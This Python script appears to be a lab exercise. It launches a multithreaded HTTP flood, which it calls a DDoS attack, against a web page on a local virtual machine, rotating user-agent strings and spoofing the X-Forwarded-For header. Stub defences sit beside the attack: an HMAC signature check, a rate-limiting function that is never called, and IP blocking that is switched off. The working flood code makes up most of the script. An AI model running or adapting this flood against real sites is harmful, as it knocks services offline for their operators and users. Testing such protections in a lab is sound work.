import requests
import threading
import subprocess
import random
import urllib3
from datetime import datetime, timedelta
import time
import socket
import os
import hmac
import hashlib
from flask import Flask, request

urllib3.disable_warnings()

# Fake IP address, but this doesn't make us anonymous
fake_ip = '192.168.1.100'
vm_ip = '10.0.2.15'

# Global variables to track rate limiting
last_request_time = datetime.min
lock = threading.Lock()

user_agents = [
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.0",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26"
]


# Define the log file path
FILE = os.path.join(os.getcwd(), "networkinfo.log")

# Secret key for request validation (replace with your own secret)
SECRET_KEY = "mysecretkey"

app = Flask(__name__)


@app.route("/verify_request", methods=["POST"])
def verify_request():
    try:
        # Read the request data
        data = request.get_data()

        # Extract the provided signature from the request headers
        provided_signature = request.headers.get("X-Signature")

        # Calculate the expected signature using HMAC-SHA1
        expected_signature = "sha1=" + hmac.new(SECRET_KEY.encode("utf-8"), data, hashlib.sha1).hexdigest()

        # Compare the provided and expected signatures
        if hmac.compare_digest(provided_signature, expected_signature):
            return "Request is valid. Proceed with further processing."
        else:
            return "Anomaly detected: Invalid request signature."

    except Exception as e:
        return f"Error verifying request: {str(e)}"


def show_logs():
    try:
        log_display = subprocess.check_output(['tail', '-n', '10', '/var/log/apache2/access.log'])
        log_display = log_display.decode('utf-8')
        print(log_display)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")


def rate_limiting():
    global last_request_time, lock

    print("Executing rate limiting (1 second between allowed requests)...")

    # Acquire lock to ensure thread safety
    with lock:
        current_time = datetime.now()
        time_since_last_request = current_time - last_request_time

        # Checks if the rate limit has been reached
        if time_since_last_request < timedelta(seconds=1):
            # Sleep to enforce rate limiting
            time.sleep((timedelta(seconds=1) - time_since_last_request).total_seconds())

        # Update last request time
        last_request_time = datetime.now()


def ip_filtering(ip_address, block_for_testing):
    # Checks if an IP address is in the blocked list.

    if block_for_testing and ip_address == vm_ip:
        print(f"Simulating blocking IP address: {ip_address}")
        return True  # IP is blocked


def http_flood(target_url, num_of_requests):
    # Flood the webpage with requests
    for _ in range(num_of_requests):
        try:
            # Randomly select a user-agent string
            user_agent = random.choice(user_agents)

            # Set block_for_testing to True for testing w/ protection and False otherwise
            if not ip_filtering(vm_ip, block_for_testing=False):
                # verify=False ensures that the SSL certificate verification for the HTTP requests is skipped
                # Send HTTP POST request with random user agent and payload
                payload = {'key1': 'value1', 'key2': 'value2'}  # Example payload
                send_request = requests.post(target_url, headers={'User-Agent': user_agent, 'X-Forwarded-For': fake_ip},
                                             data=payload, verify=False)
                print(f"Request status: {send_request.status_code}")
                print()
            else:
                print(f"Attack request from {vm_ip} blocked.")
        except Exception as e:
            print(f"Error: {str(e)}")


def ping():
    try:
        socket.setdefaulttimeout(3)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = "8.8.8.8"  # Google's DNS server
        port = 53
        server_address = (host, port)
        s.connect(server_address)
    except OSError:
        return False
    else:
        s.close()
        return True


def calculate_time(start, stop):
    difference = stop - start
    seconds = float(str(difference.total_seconds()))
    return str(timedelta(seconds=seconds)).split(".")[0]


def first_check():
    # Check if the system is already connected to the internet
    if ping():
        with open(FILE, "a") as log_file:
            log_file.write(f"{datetime.now()} - Connected\n")
    else:
        with open(FILE, "a") as log_file:
            log_file.write(f"{datetime.now()} - Disconnected\n")


if __name__ == "__main__":
    target_url = "http://10.0.2.15/real-estate-html-template/index.html"
    num_of_requests = 1000

    print(f"Starting http flood, targeting {target_url}")

    first_check()

    # Continuously monitor and log network status
    while True:
        if ping():
            # Internet connection is available
            threads = []
            for _ in range(5):
                thread = threading.Thread(target=http_flood, args=(target_url, num_of_requests))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            print(f"DDoS attack finished.")

            break
        else:
            # Internet connection is lost
            start_time = datetime.now()
            while not ping():
                pass
            stop_time = datetime.now()
            downtime = calculate_time(start_time, stop_time)
            with open(FILE, "a") as log_file:
                log_file.write(f"{start_time} - Disconnected ({downtime})\n")

    # Run the Flask app
    app.run(host="0.0.0.0", port=5000)
